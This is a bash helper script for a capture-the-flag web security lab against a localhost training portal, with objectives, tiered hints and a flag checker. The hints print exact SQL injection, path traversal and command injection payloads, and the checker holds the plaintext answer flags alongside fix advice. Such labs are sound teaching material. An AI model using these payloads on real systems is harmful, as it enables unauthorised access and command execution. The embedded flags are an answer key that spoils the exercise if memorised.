#!/bin/bash
# AppSec Lab helper — sourced on container start

cat << 'BANNER'

╔══════════════════════════════════════════════════════════════════╗
║     NEXUS FINANCIAL CORP — Web AppSec Assessment Lab             ║
║     Platform: Kali Linux  |  Target: NFC Internal Portal         ║
╚══════════════════════════════════════════════════════════════════╝
BANNER

echo -e "\e[33m  PENTEST SCOPE — NFC Internal Employee Portal\e[0m"
echo ""
echo "  Target     : http://localhost:5000"
echo "  Scope      : Full assessment — 4 vulnerabilities to find"
echo "  Flags      : 3 flags hidden — exploit to extract them"
echo ""
echo -e "\e[36m  ENDPOINT MAP:\e[0m"
echo "  POST /login          — Authentication"
echo "  GET  /user?id=N      — Employee profile viewer"
echo "  GET  /search?q=text  — Search"
echo "  GET  /files?path=f   — Document viewer"
echo "  GET  /ping?host=IP   — Network diagnostic"
echo "  GET  /api/users      — User list"
echo ""
echo -e "\e[90m  QUICK START COMMANDS:\e[0m"
echo -e "\e[90m  curl http://localhost:5000/                              # Explore the app\e[0m"
echo -e "\e[90m  curl -s http://localhost:5000/api/users | python3 -m json.tool  # List users\e[0m"
echo -e "\e[90m  show_objectives                                          # See all 3 challenges\e[0m"
echo -e "\e[90m  show_hints sqli|idor|traversal|cmdinject <1-3>           # Get hints\e[0m"
echo -e "\e[90m  check_flag 'NFCSOC{...}'                                 # Submit a flag\e[0m"
echo ""

# ── Objectives ────────────────────────────────────────────────────────────────
show_objectives() {
    echo ""
    echo -e "\e[33m══════════════════════════════════════════════════════════\e[0m"
    echo -e "\e[33m  AppSec CTF — 3 Challenges (1 flag each)\e[0m"
    echo -e "\e[33m══════════════════════════════════════════════════════════\e[0m"
    echo ""
    echo "  Challenge 1 — SQL Injection on /login  (30 pts)"
    echo "    Bypass authentication using SQL injection."
    echo "    Goal: Access the admin account's notes field to get Flag 1."
    echo ""
    echo "  Challenge 2 — Path Traversal on /files  (30 pts)"
    echo "    The document viewer doesn't properly restrict file access."
    echo "    Goal: Read /lab/flags/flag2.txt using a traversal payload."
    echo ""
    echo "  Challenge 3 — Command Injection on /ping  (40 pts)"
    echo "    The ping diagnostic passes user input directly to the shell."
    echo "    Goal: Execute commands to read /lab/flags/flag3.txt."
    echo ""
    echo "  check_flag 'NFCSOC{...}' to submit each flag."
    echo ""
}
export -f show_objectives

# ── Hints ─────────────────────────────────────────────────────────────────────
show_hints() {
    local vuln="${1:-help}"
    local level="${2:-1}"

    case "$vuln" in
        sqli|sql)
            case "$level" in
                1) echo ""
                   echo -e "\e[33m── SQL Injection Hint 1 ──\e[0m"
                   echo "  The /login endpoint builds a SQL query like:"
                   echo "    SELECT ... WHERE username='INPUT' AND password='INPUT'"
                   echo "  What happens if the username contains a single quote?"
                   echo "  Try: curl -s http://localhost:5000/login -d \"username='&password=x\""
                   echo "" ;;
                2) echo ""
                   echo -e "\e[33m── SQL Injection Hint 2 ──\e[0m"
                   echo "  To bypass the password check, comment out the rest of the query."
                   echo "  SQL comment syntax: -- (dash dash space)"
                   echo "  Payload idea: username=admin'-- &password=anything"
                   echo "  Try: curl -s -X POST http://localhost:5000/login \\"
                   echo "         --data-urlencode \"username=admin'-- \" \\"
                   echo "         --data-urlencode \"password=x\" | python3 -m json.tool"
                   echo "" ;;
                3) echo ""
                   echo -e "\e[33m── SQL Injection Hint 3 (exact) ──\e[0m"
                   echo "  Exact exploit:"
                   echo "  curl -s -X POST http://localhost:5000/login \\"
                   echo "    --data-urlencode \"username=' OR '1'='1'-- \" \\"
                   echo "    --data-urlencode \"password=x\" | python3 -m json.tool"
                   echo "  Look in the 'notes' field of the admin user for the flag."
                   echo "" ;;
            esac ;;

        idor)
            case "$level" in
                1) echo ""
                   echo -e "\e[33m── IDOR Hint 1 ──\e[0m"
                   echo "  /user?id=1 returns alice's profile."
                   echo "  There are 4 users in the system. What's in user 4's notes?"
                   echo "" ;;
                2) echo ""
                   echo -e "\e[33m── IDOR Hint 2 ──\e[0m"
                   echo "  No authentication is required to view any user's profile."
                   echo "  Simply change the id parameter:"
                   echo "  curl http://localhost:5000/user?id=4 | python3 -m json.tool"
                   echo "" ;;
            esac ;;

        traversal|path)
            case "$level" in
                1) echo ""
                   echo -e "\e[33m── Path Traversal Hint 1 ──\e[0m"
                   echo "  /files?path=readme.txt reads /lab/data/readme.txt"
                   echo "  What if you go up a directory with ../ ?"
                   echo "  The base path is /lab/data/ — flags are in /lab/flags/"
                   echo "" ;;
                2) echo ""
                   echo -e "\e[33m── Path Traversal Hint 2 ──\e[0m"
                   echo "  The app only strips leading slashes, not ../ sequences."
                   echo "  Try: curl 'http://localhost:5000/files?path=../flags/flag2.txt'"
                   echo "" ;;
                3) echo ""
                   echo -e "\e[33m── Path Traversal Hint 3 (exact) ──\e[0m"
                   echo "  curl -s 'http://localhost:5000/files?path=../flags/flag2.txt' | python3 -m json.tool"
                   echo "" ;;
            esac ;;

        cmdinject|cmd|rce)
            case "$level" in
                1) echo ""
                   echo -e "\e[33m── Command Injection Hint 1 ──\e[0m"
                   echo "  /ping?host=127.0.0.1 runs: ping -c 2 127.0.0.1"
                   echo "  The app blocks & and ; but what about the pipe | character?"
                   echo "" ;;
                2) echo ""
                   echo -e "\e[33m── Command Injection Hint 2 ──\e[0m"
                   echo "  Try injecting a command after a pipe:"
                   echo "  curl 'http://localhost:5000/ping?host=127.0.0.1|id'"
                   echo "  If that works, try reading the flag file."
                   echo "" ;;
                3) echo ""
                   echo -e "\e[33m── Command Injection Hint 3 (exact) ──\e[0m"
                   echo "  curl -s 'http://localhost:5000/ping?host=127.0.0.1|cat /lab/flags/flag3.txt'"
                   echo "  The flag appears in the 'output' field of the JSON response."
                   echo "" ;;
            esac ;;

        *)
            echo ""
            echo "  Usage: show_hints <vuln> <level>"
            echo ""
            echo "  Vulns : sqli  |  idor  |  traversal  |  cmdinject"
            echo "  Level : 1 (vague)  2 (guided)  3 (exact answer)"
            echo ""
            echo "  Examples:"
            echo "    show_hints sqli 1"
            echo "    show_hints traversal 2"
            echo "    show_hints cmdinject 3"
            echo ""
            ;;
    esac
}
export -f show_hints

# ── Flag checker ──────────────────────────────────────────────────────────────
check_flag() {
    if [ -z "$1" ]; then
        echo "  Usage: check_flag 'NFCSOC{...}'"
        return 1
    fi

    FLAG1="NFCSOC{sql_1nj3ct10n_4uth_byp4ss}"
    FLAG2="NFCSOC{p4th_tr4v3rs4l_f1l3_r34d}"
    FLAG3="NFCSOC{c0mm4nd_1nj3ct10n_rc3}"

    if [ "$1" = "$FLAG1" ]; then
        echo -e "\e[32m  [+] FLAG 1 CORRECT — SQL Injection\e[0m"
        echo "      Technique: Authentication bypass via ' OR '1'='1'-- "
        echo "      MITRE: T1190 (Exploit Public-Facing Application)"
        echo "      Fix: Use parameterised queries / prepared statements"
    elif [ "$1" = "$FLAG2" ]; then
        echo -e "\e[32m  [+] FLAG 2 CORRECT — Path Traversal\e[0m"
        echo "      Technique: Directory traversal via ../ sequences"
        echo "      MITRE: T1083 (File and Directory Discovery)"
        echo "      Fix: Use os.path.realpath() and validate against allowed base"
    elif [ "$1" = "$FLAG3" ]; then
        echo -e "\e[32m  [+] FLAG 3 CORRECT — Command Injection\e[0m"
        echo "      Technique: Shell metacharacter injection via pipe |"
        echo "      MITRE: T1059 (Command and Scripting Interpreter)"
        echo "      Fix: Use subprocess with list args (no shell=True), whitelist IP format"
    else
        echo -e "\e[31m  [!] Incorrect flag.\e[0m"
        echo "      Format: NFCSOC{...}"
        echo "      Run show_objectives to see what to look for."
    fi
    echo ""
}
export -f check_flag
